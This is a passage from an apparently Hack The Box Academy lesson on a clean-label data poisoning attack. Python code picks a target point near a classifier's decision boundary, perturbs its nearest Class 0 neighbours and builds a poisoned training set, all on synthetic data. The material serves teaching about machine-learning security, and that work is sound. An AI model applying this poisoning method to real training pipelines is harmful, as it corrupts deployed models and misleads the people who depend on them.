    plt.contourf(
        xx_mesh,
        yy_mesh,
        Z_mesh,
        cmap=cmap_light,
        <span class="hljs-keyword">alpha</span>=0.6,
        zorder=0,  # Ensure contour is lowest layer
    )

    # <span class="hljs-keyword">Plot</span> the data points
    # Ensure cmap <span class="hljs-keyword">for</span> points matches number of classes <span class="hljs-keyword">in</span> <span class="hljs-built_in">y</span>
    cmap_bold = (
        plt.cm.colors.ListedColormap(class_colors[: int(max_class_idx_y) + 1])
        <span class="hljs-keyword">if</span> max_class_idx_y &gt;= 0
        <span class="hljs-keyword">else</span> plt.cm.colors.ListedColormap(class_colors[:1])
    )
    plt.<span class="hljs-keyword">scatter</span>(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=cmap_bold,
        edgecolors=node_black,
        s=50,
        <span class="hljs-keyword">alpha</span>=0.8,
        zorder=1,  # Points above contour
    )

    # <span class="hljs-keyword">Plot</span> highlighted points <span class="hljs-keyword">if</span> any
    highlight_handles = []
    <span class="hljs-keyword">if</span> highlight_indices is not None and len(highlight_indices) &gt; 0:
        num_highlights = len(highlight_indices)
        # Provide defaults <span class="hljs-keyword">if</span> None
        _highlight_markers = (
            highlight_markers
            <span class="hljs-keyword">if</span> highlight_markers is not None
            <span class="hljs-keyword">else</span> [<span class="hljs-string">"o"</span>] * num_highlights
        )
        _highlight_colors = (
            highlight_colors
            <span class="hljs-keyword">if</span> highlight_colors is not None
            <span class="hljs-keyword">else</span> [vivid_purple] * num_highlights
        )
        _highlight_labels = (
            highlight_labels <span class="hljs-keyword">if</span> highlight_labels is not None <span class="hljs-keyword">else</span> [<span class="hljs-string">""</span>] * num_highlights
        )

        <span class="hljs-keyword">for</span> i, idx <span class="hljs-keyword">in</span> enumerate(highlight_indices):
            # Check index validity gracefully
            <span class="hljs-keyword">if</span> not (0 &lt;= idx &lt; X.shape[0]):
                <span class="hljs-keyword">print</span>(
                    f<span class="hljs-string">"Warning: Invalid highlight index {idx} skipped."</span>
                )
                <span class="hljs-keyword">continue</span>

            # Determine marker, edge color, and <span class="hljs-keyword">label</span> <span class="hljs-keyword">for</span> this point
            marker = _highlight_markers[i % len(_highlight_markers)]  # Get the marker
            edge_color = _highlight_colors[i % len(_highlight_colors)]
            <span class="hljs-keyword">label</span> = _highlight_labels[i % len(_highlight_labels)]

            # Determine face color based <span class="hljs-keyword">on</span> the point's true <span class="hljs-keyword">class</span> from <span class="hljs-built_in">y</span>
            try:
                # Ensure point_class is a valid integer index <span class="hljs-keyword">for</span> class_colors
                point_class = int(y[idx])
                <span class="hljs-keyword">if</span> not (0 &lt;= point_class &lt; len(class_colors)):
                    raise IndexError
                face_color = class_colors[point_class]
            except (IndexError, ValueError, TypeError):
                <span class="hljs-keyword">print</span>(
                    f<span class="hljs-string">"Warning: Class index '{y[idx]}' invalid for highlighted point {idx}. Using fallback."</span>
                )
                face_color = hacker_grey  # Fallback

            current_zorder = (
                3 <span class="hljs-keyword">if</span> marker == <span class="hljs-string">"P"</span> <span class="hljs-keyword">else</span> 2
            )  # <span class="hljs-keyword">If</span> marker is 'P', <span class="hljs-keyword">use</span> zorder 3, <span class="hljs-keyword">else</span> 2

            # <span class="hljs-keyword">Plot</span> the highlighted point
            plt.<span class="hljs-keyword">scatter</span>(
                X[idx, 0],
                X[idx, 1],
                facecolors=face_color,
                edgecolors=edge_color,
                marker=marker,  # <span class="hljs-keyword">Use</span> the determined marker
                s=180,
                linewidths=2,
                <span class="hljs-keyword">alpha</span>=1.0,  # Make highlighted points fully opaque
                zorder=current_zorder,  # <span class="hljs-keyword">Use</span> the zorder determined <span class="hljs-keyword">by</span> the marker
            )
            # Create legend handle <span class="hljs-keyword">if</span> <span class="hljs-keyword">label</span> exists
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">label</span>:
                # <span class="hljs-keyword">Use</span> Line2D <span class="hljs-keyword">for</span> better control over legend marker appearance
                highlight_handles.<span class="hljs-keyword">append</span>(
                    plt.Line2D(
                        [0],
                        [0],
                        marker=marker,
                        color=<span class="hljs-string">"w"</span>,
                        <span class="hljs-keyword">label</span>=<span class="hljs-keyword">label</span>,
                        markerfacecolor=face_color,
                        markeredgecolor=edge_color,
                        markersize=10,
                        linestyle=<span class="hljs-string">"None"</span>,
                        markeredgewidth=1.5,
                    )
                )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel(<span class="hljs-string">"Feature 1 (Standardized)"</span>, fontsize=12)
    plt.ylabel(<span class="hljs-string">"Feature 2 (Standardized)"</span>, fontsize=12)

    # Create <span class="hljs-keyword">class</span> legend handles (based <span class="hljs-keyword">on</span> unique classes <span class="hljs-keyword">in</span> y)
    class_handles = []
    # Check <span class="hljs-keyword">if</span> y is not empty before finding unique classes
    <span class="hljs-keyword">if</span> y.size &gt; 0:
        unique_classes_present_y = sorted(np.unique(y))
        <span class="hljs-keyword">for</span> class_idx <span class="hljs-keyword">in</span> unique_classes_present_y:
            try:
                int_class_idx = int(class_idx)
                # Check <span class="hljs-keyword">if</span> index is valid <span class="hljs-keyword">for</span> the potentially extended class_colors
                <span class="hljs-keyword">if</span> 0 &lt;= int_class_idx &lt; len(class_colors):
                    class_handles.<span class="hljs-keyword">append</span>(
                        plt.Line2D(
                            [0],
                            [0],
                            marker=<span class="hljs-string">"o"</span>,
                            color=<span class="hljs-string">"w"</span>,
                            <span class="hljs-keyword">label</span>=f<span class="hljs-string">"Class {int_class_idx}"</span>,
                            markersize=10,
                            markerfacecolor=class_colors[int_class_idx],
                            markeredgecolor=node_black,
                            linestyle=<span class="hljs-string">"None"</span>,
                        )
                    )
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">print</span>(
                        f<span class="hljs-string">"Warning: Cannot create class legend entry for class {int_class_idx}, color index out of bounds after potential extension."</span>
                    )
            except (ValueError, TypeError):
                <span class="hljs-keyword">print</span>(
                    f<span class="hljs-string">"Warning: Cannot create class legend entry for non-integer class {class_idx}."</span>
                )
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">print</span>(
            f<span class="hljs-string">"Info: No data points (y is empty), skipping class legend entries."</span>
        )

    # Combine legends
    all_handles = class_handles + highlight_handles
    <span class="hljs-keyword">if</span> all_handles:  # Only show legend <span class="hljs-keyword">if</span> there's something to legend
        plt.legend(handles=all_handles, title=<span class="hljs-string">"Classes, Points &amp; Boundaries"</span>)

    plt.grid(True, color=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, linewidth=0.5, <span class="hljs-keyword">alpha</span>=0.3)
    # Ensure <span class="hljs-keyword">plot</span> limits strictly match the meshgrid <span class="hljs-keyword">range</span> used <span class="hljs-keyword">for</span> contourf
    plt.xlim(xx_mesh.<span class="hljs-built_in">min</span>(), xx_mesh.<span class="hljs-built_in">max</span>())
    plt.ylim(yy_mesh.<span class="hljs-built_in">min</span>(), yy_mesh.<span class="hljs-built_in">max</span>())
    plt.show()


# <span class="hljs-keyword">Plot</span> the decision boundary <span class="hljs-keyword">for</span> the baseline model using the pre-calculated Z_baseline_3c
<span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Visualizing Baseline Model Decision Boundaries ---"</span>)
plot_decision_boundary_multi(
    X_train_3c,  # Training data points
    y_train_3c,  # Training labels
    Z_baseline_3c,  # Meshgrid predictions from baseline model
    xx_3c,  # Meshgrid x coordinates
    yy_3c,  # Meshgrid y coordinates
    title=f<span class="hljs-string">"Baseline Model Decision Boundaries (3 Classes)\nTest Accuracy: {baseline_accuracy_3c:.4f}"</span>,
)
</code></pre>
<p>The plot below shows the decision regions learned by the baseline model. Each colored region represents the area of the feature space where the model would predict the corresponding class (<code>Azure</code> for Class 0, <code>Yellow</code> for Class 1, <code>Red</code> for Class 2). The lines where the colors meet are the effective decision boundaries.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/feature_clean_boundary.png" alt="feature\_clean\_boundary.png"></p>
<hr>
<h2 id="identifying-a-target">Identifying a Target</h2>
<hr>
<p>Now that we have a baseline, we can proceed with the actual <code>Clean Label Attack</code>. Our specific goal is to modify the training data such that a chosen <code>target point</code>, 𝐱target, which originally belongs to <code>Class 1</code> (Yellow), will be misclassified by the retrained model as belonging to <code>Class 0</code> (Blue).</p>
<p>We aim to choose a point that genuinely belongs to <code>Class 1</code> (its true label ytarget=1) but also lies relatively close to the decision boundary separating <code>Class 1</code> from <code>Class 0</code>, as determined by the original baseline model. Points near the boundary are inherently more vulnerable to misclassification if the boundary shifts, even slightly, after retraining on the poisoned data.</p>
<p>To identify such a point, we can analyze the decision function scores produced by the baseline model. Remember that the decision boundary between <code>Class 0</code> and <code>Class 1</code> is where their respective scores, z0 and z1, are equal. We can define a function representing the difference between these scores:</p>
<p>f01(𝐱)=z0−z1=(𝐰0−𝐰1)T𝐱+(b0−b1)</p>
<p>The baseline model predicts <code>Class 1</code> for a point 𝐱 if its score z1 is greater than the scores for all other classes k. Specifically considering <code>Class 0</code> and <code>Class 1</code>, the model favors <code>Class 1</code> if z1&gt;z0. This condition is equivalent to the score difference f01(𝐱) being negative (f01(𝐱)&lt;0).</p>
<p>Therefore, we are looking for a specific point 𝐱target within the training set that meets our criteria: ytarget=1, and its score difference f01(𝐱target) must be negative (confirming the baseline model classifies it correctly relative to <code>Class 0</code>), while also being as close to zero as possible. A score difference that is the largest negative value indicates the point is correctly classified but is nearest to the f01(𝐱)=0 boundary.</p>
<p>To find this optimal target point, we calculate f01(𝐱) for all training points 𝐱i whose true label yi is 1. We then select the specific point 𝐱target that yields the largest negative value (i.e., the value closest to zero) for f01.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Selecting Target Point ---"</span>)
<span class="hljs-comment"># We use the baseline parameters w0_base, b0_base, w1_base, b1_base extracted earlier</span>
<span class="hljs-comment"># Calculate the difference vector and intercept for the 0-vs-1 boundary</span>
w_diff_01_base = w0_base - w1_base
b_diff_01_base = b0_base - b1_base
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Boundary vector (w0-w1): {w_diff_01_base}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Intercept difference (b0-b1): {b_diff_01_base}"</span>)

<span class="hljs-comment"># Identify indices of all Class 1 points in the original clean training set</span>
class1_indices_train = np.where(y_train_3c == <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]

<span class="hljs-keyword">if</span> len(class1_indices_train) == <span class="hljs-number">0</span>:
    <span class="hljs-keyword">raise</span> ValueError(
        <span class="hljs-string">"CRITICAL: No Class 1 points found in the training data. Cannot select target."</span>
    )
<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"Found {len(class1_indices_train)} Class 1 points in the training set."</span>)

<span class="hljs-comment"># Get the feature vectors for only the Class 1 points</span>
X_class1_train = X_train_3c[class1_indices_train]

<span class="hljs-comment"># Calculate the decision function f_01(x) = (w0-w1)^T x + (b0-b1) for these Class 1 points</span>
<span class="hljs-comment"># A negative value means the point is on the Class 1 side of the 0-vs-1 boundary</span>
decision_values_01 = X_class1_train @ w_diff_01_base + b_diff_01_base

<span class="hljs-comment"># Find indices within the subset of Class 1 points that are correctly classified (f_01 &lt; 0)</span>
class1_on_correct_side_indices_relative = np.where(decision_values_01 &lt; <span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]

<span class="hljs-keyword">if</span> len(class1_on_correct_side_indices_relative) == <span class="hljs-number">0</span>:
    <span class="hljs-comment"># This case is unlikely if the baseline model has decent accuracy, but handle it.</span>
    <span class="hljs-keyword">print</span>(
        f<span class="hljs-string">"{malware_red}Warning:{white} No Class 1 points found on the expected side (f_01 &lt; 0) of the 0-vs-1 baseline boundary."</span>
    )
    <span class="hljs-keyword">print</span>(
        <span class="hljs-string">"Selecting the Class 1 point with the minimum absolute decision value instead."</span>
    )
    <span class="hljs-comment"># Find index (relative to class1 subset) with the smallest absolute distance to boundary</span>
    target_point_index_relative = np.argmin(np.abs(decision_values_01))
<span class="hljs-keyword">else</span>:
    <span class="hljs-comment"># Among the correctly classified points, find the one closest to the boundary</span>
    <span class="hljs-comment"># This corresponds to the maximum (least negative) decision value</span>
    target_point_index_relative = class1_on_correct_side_indices_relative[
        np.argmax(decision_values_01[class1_on_correct_side_indices_relative])
    ]

<span class="hljs-comment"># Map the relative index (within the class1 subset) back to the absolute index in the original X_train_3c array</span>
target_point_index_absolute = class1_indices_train[target_point_index_relative]

<span class="hljs-comment"># Retrieve the target point's features and true label</span>
X_target = X_train_3c[target_point_index_absolute]
y_target = y_train_3c[
    target_point_index_absolute
]  <span class="hljs-comment"># Should be 1 based on selection logic</span>

<span class="hljs-comment"># Sanity Check: Verify the chosen point's class and baseline prediction</span>
target_baseline_pred = baseline_model_3c.predict(X_target.reshape(<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>))[<span class="hljs-number">0</span>]
target_decision_value = decision_values_01[target_point_index_relative]

<span class="hljs-keyword">print</span>(f<span class="hljs-string">"\nSelected Target Point Index (absolute): {target_point_index_absolute}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Target Point Features: {X_target}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Target Point True Label (y_target): {y_target}"</span>)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Target Point Baseline Prediction: {target_baseline_pred}"</span>)
<span class="hljs-keyword">print</span>(
    f<span class="hljs-string">"Target Point Baseline 0-vs-1 Decision Value (f_01): {target_decision_value:.4f}"</span>
)

<span class="hljs-keyword">if</span> y_target != <span class="hljs-number">1</span>:
    <span class="hljs-keyword">print</span>(
        f<span class="hljs-string">"Error: Selected target point does not have label 1! Check logic."</span>
    )
<span class="hljs-keyword">if</span> target_baseline_pred != y_target:
    <span class="hljs-keyword">print</span>(
        f<span class="hljs-string">"Warning: Baseline model actually misclassifies the chosen target point ({target_baseline_pred}). Attack might trivially succeed or have unexpected effects."</span>
    )
<span class="hljs-keyword">if</span> target_decision_value &gt;= <span class="hljs-number">0</span>:
    <span class="hljs-keyword">print</span>(
        f<span class="hljs-string">"Warning: Selected target point has f_01 &gt;= 0 ({target_decision_value:.4f}), meaning it wasn't on the Class 1 side of the 0-vs-1 boundary. Check logic or baseline model."</span>
    )

<span class="hljs-comment"># Visualize the data highlighting the selected target point near the boundary</span>
<span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Visualizing Training Data with Target Point ---"</span>)
plot_data_multi(
    X_train_3c,
    y_train_3c,
    title=<span class="hljs-string">"Training Data Highlighting the Target Point (Near Boundary)"</span>,
    highlight_indices=[target_point_index_absolute],
    highlight_markers=[<span class="hljs-string">"P"</span>],  <span class="hljs-comment"># 'P' for Plus sign marker (Target)</span>
    highlight_colors=[white],  <span class="hljs-comment"># White edge color for visibility</span>
    highlight_labels=[f<span class="hljs-string">"Target (Class {y_target}, Idx {target_point_index_absolute})"</span>],
)
</code></pre>
<p>The above code identifies a good candidate for us to work with, index <code>373</code>:</p>
<p>Code: python</p>
<pre><code class="lang-python">--- Selecting Target <span class="hljs-keyword">Point</span> ---
Boundary vector (w0-w1): [<span class="hljs-number">-5.78792514</span>  <span class="hljs-number">6.32142485</span>]
Intercept difference (b0-b1): <span class="hljs-number">-0.9207223376477074</span>
Found <span class="hljs-number">350</span> Class <span class="hljs-number">1</span> points in the training set.

Selected Target <span class="hljs-keyword">Point</span> Index (absolute): <span class="hljs-number">373</span>
Target <span class="hljs-keyword">Point</span> Features: [<span class="hljs-number">-0.55111155</span> <span class="hljs-number">-0.36675028</span>]
Target <span class="hljs-keyword">Point</span> <span class="hljs-keyword">True</span> <span class="hljs-keyword">Label</span> (y_target): <span class="hljs-number">1</span>
Target <span class="hljs-keyword">Point</span> <span class="hljs-keyword">Baseline</span> Prediction: <span class="hljs-number">1</span>
Target <span class="hljs-keyword">Point</span> <span class="hljs-keyword">Baseline</span> <span class="hljs-number">0</span>-vs<span class="hljs-number">-1</span> Decision <span class="hljs-keyword">Value</span> (f_01): <span class="hljs-number">-0.0493</span>
</code></pre>
<p>If we plot index <code>373</code> we can easily see where it is in the dataset.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/feature_attack_targted_point.png" alt="feature\_attack\_targted\_point.png"></p>
<p>\</p>
<hr>
<h2 id="the-clean-label-attack">The Clean Label Attack</h2>
<hr>
<p>Having identified the <code>target point</code> 𝐱target, our next step is to manipulate the training data specifically to cause its misclassification. We achieve this by subtly shifting the learned <code>decision boundary</code>. We will perturb the selected <code>Class 0</code> (Blue) data points that are neighbours to the <code>target point</code> in order to shift the boundary.</p>
<p>We first need to locate several <code>Class 0</code> points residing closest to 𝐱target within the feature space. These neighbours serve as anchors influencing the boundary’s local position. We then calculate small <code>perturbations</code>, denoted δi, for these selected neighbours 𝐱i. These perturbations are specifically designed to push each neighbour slightly across the original decision boundary (f01(𝐱)=0) and into the region typically associated with <code>Class 1</code> (Yellow). This process yields perturbed points 𝐱′i=𝐱i+δi.</p>
<p>The poisoned training dataset is then created by substituting these original neighbours 𝐱i with their perturbed counterparts 𝐱′i. Crucially, we assign the original <code>Class 0</code> label to these perturbed points 𝐱′i, even though they now sit in the <code>Class 1</code> region according to the baseline model.</p>
<p>When the model retrains on this poisoned data, it encounters a conflict: points (𝐱′i) labeled <code>0</code> are located where it would expect points labeled <code>1</code>. To reconcile this based on the provided (and unchanged) labels, the model is forced to adjust its decision boundary. Typically, it pushes the boundary f01(𝐱)=0 outwards into the original <code>Class 1</code> region to correctly classify the perturbed points 𝐱′i as <code>Class 0</code>. A successful attack occurs when this induced boundary shift is significant enough to engulf the nearby <code>target point</code> 𝐱target, causing it to fall on the <code>Class 0</code> side of the new boundary.</p>
<p>Throughout this process, the <code>perturbations</code> δi must remain small. This subtlety ensures the <code>Class 0</code> label still appears plausible for the altered feature vectors 𝐱′i, thus preserving the &quot;clean label&quot; characteristic of the attack where only features are modified, not labels.</p>
<h3 id="attack-implementation">Attack Implementation</h3>
<p>We begin the implementation by finding the required <code>Class 0</code> neighbours closest to the <code>target point</code>. We use Scikit-learn’s <code>NearestNeighbors</code> algorithm, fitting it only on the <code>Class 0</code> training data and then querying it with the coordinates of 𝐱target. We must specify how many neighbours (<code>n_neighbors_to_perturb</code>) to select for modification.</p>
<p>Code: python</p>
<pre><code class="lang-python">print(<span class="hljs-string">"\n--- Identifying Class 0 Neighbors to Perturb ---"</span>)
<span class="hljs-attr">n_neighbors_to_perturb</span> = <span class="hljs-number">5</span> <span class="hljs-comment"># Hyperparameter: How many neighbors to modify</span>

<span class="hljs-comment"># Find indices of all Class 0 points in the original training set</span>
<span class="hljs-attr">class0_indices_train</span> = np.where(<span class="hljs-attr">y_train_3c</span> == <span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]

<span class="hljs-keyword">if</span> len(class0_indices_train) == <span class="hljs-number">0</span>:
    raise ValueError(<span class="hljs-string">"CRITICAL: No Class 0 points found. Cannot find neighbors to perturb."</span>)
<span class="hljs-keyword">else</span>:
    print(f<span class="hljs-string">"Found {len(class0_indices_train)} Class 0 points in the training set."</span>)

<span class="hljs-comment"># Get features of only Class 0 points</span>
<span class="hljs-attr">X_class0_train</span> = X_train_3c[class0_indices_train]

<span class="hljs-comment"># Sanity check to ensure we don't request more neighbors than available</span>
<span class="hljs-keyword">if</span> n_neighbors_to_perturb &gt; len(X_class0_train):
    print(f<span class="hljs-string">"Warning: Requested {n_neighbors_to_perturb} neighbors, but only {len(X_class0_train)} Class 0 points available. Using all available."</span>)
    <span class="hljs-attr">n_neighbors_to_perturb</span> = len(X_class0_train)

<span class="hljs-keyword">if</span> <span class="hljs-attr">n_neighbors_to_perturb</span> == <span class="hljs-number">0</span>:
    raise ValueError(<span class="hljs-string">"No Class 0 neighbors can be selected to perturb (n_neighbors_to_perturb=0). Cannot proceed."</span>)

<span class="hljs-comment"># Initialize and fit NearestNeighbors on the Class 0 data points</span>
<span class="hljs-comment"># We use the default Euclidean distance ('minkowski' with p=2)</span>
<span class="hljs-attr">nn_finder</span> = NearestNeighbors(<span class="hljs-attr">n_neighbors=n_neighbors_to_perturb,</span> <span class="hljs-attr">algorithm='auto')</span>
nn_finder.fit(X_class0_train)

<span class="hljs-comment"># Find the indices (relative to X_class0_train) and distances of the k nearest Class 0 neighbors to X_target</span>
distances, <span class="hljs-attr">indices_relative</span> = nn_finder.kneighbors(X_target.reshape(<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>))

<span class="hljs-comment"># Map the relative indices found within X_class0_train back to the original indices in X_train_3c</span>
<span class="hljs-attr">neighbor_indices_absolute</span> = class0_indices_train[indices_relative.flatten()]
<span class="hljs-comment"># Get the original feature vectors of these neighbors (needed for perturbation)</span>
<span class="hljs-attr">X_neighbors</span> = X_train_3c[neighbor_indices_absolute]

<span class="hljs-comment"># Output the findings for verification</span>
print(f<span class="hljs-string">"\nTarget Point Index: {target_point_index_absolute} (True Class {y_target})"</span>)
print(f<span class="hljs-string">"Identified {len(neighbor_indices_absolute)} closest Class 0 neighbors to perturb:"</span>)
print(f<span class="hljs-string">"  Indices in X_train_3c: {neighbor_indices_absolute}"</span>)
print(f<span class="hljs-string">"  Distances to target: {distances.flatten()}"</span>)

<span class="hljs-comment"># Sanity check: Ensure the target itself wasn't accidentally included (e.g., if it was mislabeled or data is unusual)</span>
<span class="hljs-keyword">if</span> target_point_index_absolute <span class="hljs-keyword">in</span> neighbor_indices_absolute:
     print(f<span class="hljs-string">"Error: The target point itself was selected as one of its own Class 0 neighbors. This indicates a potential issue in data or logic."</span>)
</code></pre>
<p>This has identified the 5 closest Class 0 points to our target:</p>
<p>Code: python</p>
<pre><code class="lang-python">--- Identifying <span class="hljs-keyword">Class</span> <span class="hljs-number">0</span> Neighbors <span class="hljs-keyword">to</span> Perturb ---
Found <span class="hljs-number">350</span> <span class="hljs-keyword">Class</span> <span class="hljs-number">0</span> points <span class="hljs-keyword">in</span> the training <span class="hljs-keyword">set</span>.

Target Point <span class="hljs-keyword">Index</span>: <span class="hljs-number">373</span> (<span class="hljs-keyword">True</span> <span class="hljs-keyword">Class</span> <span class="hljs-number">1</span>)
Identified <span class="hljs-number">5</span> closest <span class="hljs-keyword">Class</span> <span class="hljs-number">0</span> neighbors <span class="hljs-keyword">to</span> perturb:
  Indices <span class="hljs-keyword">in</span> X_train_3c: [ <span class="hljs-number">761</span>   <span class="hljs-number">82</span> <span class="hljs-number">1035</span>  <span class="hljs-number">919</span>  <span class="hljs-number">491</span>]
  Distances <span class="hljs-keyword">to</span> target: [<span class="hljs-number">0.10318016</span> <span class="hljs-number">0.12277741</span> <span class="hljs-number">0.14917583</span> <span class="hljs-number">0.25081115</span> <span class="hljs-number">0.30161621</span>]
</code></pre>
<p>Having identified the neighbours, we now determine the exact change (<code>perturbation</code>) to apply to each one. The goal is to push these points (𝐱i) from their original <code>Class 0</code> region (where f01(𝐱i)&gt;0) just across the boundary into the <code>Class 1</code> region (where f01&lt;0).</p>
<p>The most direct path across the boundary f01(𝐱)=(𝐰0−𝐰1)T𝐱+(b0−b1)=0 is perpendicular to it. The vector 𝐯01=(𝐰0−𝐰1), which defines the boundary, is the <code>normal vector</code> and points perpendicular to the boundary hyperplane. To move a point from the <code>Class 0</code> side to the <code>Class 1</code> side, we need to push it in the direction <code>opposite</code> to this normal vector, namely −𝐯01.</p>
<p>We first normalize this direction vector to obtain a unit vector indicating the push direction:</p>
<p>𝐮push=−𝐯01∥𝐯01∥=−(𝐰0−𝐰1)∥𝐰0−𝐰1∥</p>
<p>The distance we push the points is controlled by a small hyperparameter, ϵcross. This value determines how far across the boundary the neighbours are shifted. Smaller values yield subtler changes, while larger values create a stronger push but might make the perturbed points less plausible as <code>Class 0</code>.</p>
<p>The final perturbation vector δi applied to each neighbour 𝐱i is the unit push direction scaled by the chosen magnitude:</p>
<p>δi=ϵcross×𝐮push</p>
<p>Applying this results in the perturbed point 𝐱′i=𝐱i+δi. We expect the original neighbour 𝐱i to satisfy f01(𝐱i)&gt;0, while the perturbed point 𝐱′i should satisfy f01(𝐱′i)&lt;0.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Calculating Perturbation Vector ---"</span>)
<span class="hljs-comment"># Use the boundary vector w_diff_01_base = w0_base - w1_base calculated earlier</span>

<span class="hljs-comment"># The direction to push Class 0 points into Class 1 region is opposite to the normal vector (w0-w1)</span>
push_direction = -w_diff_01_base
norm_push_direction = np.linalg.norm(push_direction)

<span class="hljs-comment"># Handle potential zero vector for the boundary normal</span>
<span class="hljs-keyword">if</span> norm_push_direction &lt; <span class="hljs-number">1e-9</span>: <span class="hljs-comment"># Use a small threshold for floating point comparison</span>
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"Boundary vector norm (||w0-w1||) is close to zero. Cannot determine push direction reliably."</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-comment"># Normalize the direction vector to unit length</span>
    unit_push_direction = push_direction / norm_push_direction
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"Calculated unit push direction vector (normalized - (w0-w1)): {unit_push_direction}"</span>)

<span class="hljs-comment"># Define perturbation magnitude (how far across the boundary to push)</span>
epsilon_cross = <span class="hljs-number">0.25</span>
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Perturbation magnitude (epsilon_cross): {epsilon_cross}"</span>)

<span class="hljs-comment"># Calculate the final perturbation vector (direction * magnitude)</span>
perturbation_vector = epsilon_cross * unit_push_direction
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Final perturbation vector (delta): {perturbation_vector}"</span>)
</code></pre>
<p>With this, we have calculated the vector to apply:</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-selector-tag">---</span> <span class="hljs-selector-tag">Calculating</span> <span class="hljs-selector-tag">Perturbation</span> <span class="hljs-selector-tag">Vector</span> <span class="hljs-selector-tag">---</span>
<span class="hljs-selector-tag">Calculated</span> <span class="hljs-selector-tag">unit</span> <span class="hljs-selector-tag">push</span> <span class="hljs-selector-tag">direction</span> <span class="hljs-selector-tag">vector</span> (normalized - (w0-w1)): <span class="hljs-selector-attr">[ 0.67529883 -0.73754423]</span>
<span class="hljs-selector-tag">Perturbation</span> <span class="hljs-selector-tag">magnitude</span> (epsilon_cross): <span class="hljs-selector-tag">0</span><span class="hljs-selector-class">.25</span>
<span class="hljs-selector-tag">Final</span> <span class="hljs-selector-tag">perturbation</span> <span class="hljs-selector-tag">vector</span> (delta): <span class="hljs-selector-attr">[ 0.16882471 -0.18438606]</span>
</code></pre>
<p>We apply this single calculated <code>perturbation_vector</code> to each of the selected <code>Class 0</code> neighbors to generate the poisoned dataset. We begin by creating a <code>safe copy</code> of the original training features and labels, named <code>X_train_poisoned</code> and <code>y_train_poisoned</code> respectively. Then, we iterate through the indices of the identified neighbours (<code>neighbor_indices_absolute</code>). For each <code>neighbor_idx</code>, we retrieve its original feature vector 𝐱i, calculate the perturbed vector 𝐱′i=𝐱i+perturbation_vector, and update the corresponding entry in <code>X_train_poisoned</code>. The label for this index in <code>y_train_poisoned</code> remains unchanged as <code>0</code>, copied from the original <code>y_train_3c</code>. This loop constructs the final poisoned dataset ready for retraining.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Applying Perturbations to Create Poisoned Dataset ---"</span>)
<span class="hljs-comment"># Create a safe copy of the original training data to modify</span>
X_train_poisoned = X_train_3c.copy()
y_train_poisoned = (
    y_train_3c.copy()
)  <span class="hljs-comment"># Labels are copied but not changed for perturbed points</span>

perturbed_indices_list = []  <span class="hljs-comment"># Keep track of which indices were actually modified</span>

<span class="hljs-comment"># Iterate through the identified neighbor indices and their original features</span>
<span class="hljs-comment"># neighbor_indices_absolute holds the indices in X_train_3c/y_train_3c</span>
<span class="hljs-comment"># X_neighbors holds the corresponding original feature vectors</span>
<span class="hljs-keyword">for</span> i, neighbor_idx <span class="hljs-keyword">in</span> enumerate(neighbor_indices_absolute):
    X_neighbor_original = X_neighbors[i]  <span class="hljs-comment"># Original feature vector of the i-th neighbor</span>

    <span class="hljs-comment"># Calculate the new position of the perturbed neighbor</span>
    X_perturbed_neighbor = X_neighbor_original + perturbation_vector

    <span class="hljs-comment"># Replace the original neighbor's features with the perturbed features in the copied dataset</span>
    X_train_poisoned[neighbor_idx] = X_perturbed_neighbor
    <span class="hljs-comment"># The label y_train_poisoned[neighbor_idx] remains 0 (Class 0)</span>

    perturbed_indices_list.append(neighbor_idx)  <span class="hljs-comment"># Record the index that was modified</span>

    <span class="hljs-comment"># Verify the effect of perturbation on the f_01 score</span>
    f01_orig = X_neighbor_original @ w_diff_01_base + b_diff_01_base
    f01_pert = X_perturbed_neighbor @ w_diff_01_base + b_diff_01_base
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"  Neighbor Index {neighbor_idx} (Label 0): Perturbed."</span>)
    <span class="hljs-keyword">print</span>(
        f<span class="hljs-string">"     Original f01 = {f01_orig:.4f} (&gt;0 expected), Perturbed f01 = {f01_pert:.4f} (&lt;0 expected)"</span>
    )
    <span class="hljs-keyword">if</span> f01_pert &gt;= <span class="hljs-number">0</span>:
        <span class="hljs-keyword">print</span>(
            f<span class="hljs-string">"     Warning: Perturbed point did not cross the baseline boundary (f01 &gt;= 0). Epsilon might be too small."</span>
        )

<span class="hljs-keyword">print</span>(
    f<span class="hljs-string">"\nCreated poisoned training dataset by perturbing features of {len(perturbed_indices_list)} Class 0 points."</span>
)
<span class="hljs-comment"># Check the size to ensure it's unchanged</span>
<span class="hljs-keyword">print</span>(
    f<span class="hljs-string">"Poisoned training dataset size: {X_train_poisoned.shape[0]} samples (should match original {X_train_3c.shape[0]})."</span>
)

